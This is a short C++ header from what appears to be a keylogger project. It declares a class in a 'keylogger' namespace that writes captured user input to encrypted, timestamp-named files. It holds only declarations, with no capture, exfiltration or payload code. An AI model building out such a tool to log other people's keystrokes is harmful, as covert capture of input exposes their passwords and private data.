#pragma once

#include <memory>

#include "Encryptor.h"
#include "FileSystemAccess.h"

namespace keylogger
{
class UserInputEncryptedFileLogger
{
public:
    UserInputEncryptedFileLogger(std::shared_ptr<FileSystemAccess>, std::unique_ptr<Encryptor>);

    std::string writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& logData);

private:
    std::shared_ptr<FileSystemAccess> fileSystemAccess;
    std::unique_ptr<Encryptor> encryptor;
};
}